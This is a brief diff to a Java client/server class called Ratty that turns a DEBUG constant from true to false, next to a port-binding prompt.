@@ -21,7 +21,7 @@ public final class Ratty {
 	private static int port;
 	private static boolean client;
 	
-	private static final boolean DEBUG = true;
+	private static final boolean DEBUG = false;
 	
 	private static final String PORT_INPUT_MESSAGE = "Which port should the server be bind to?";
 	
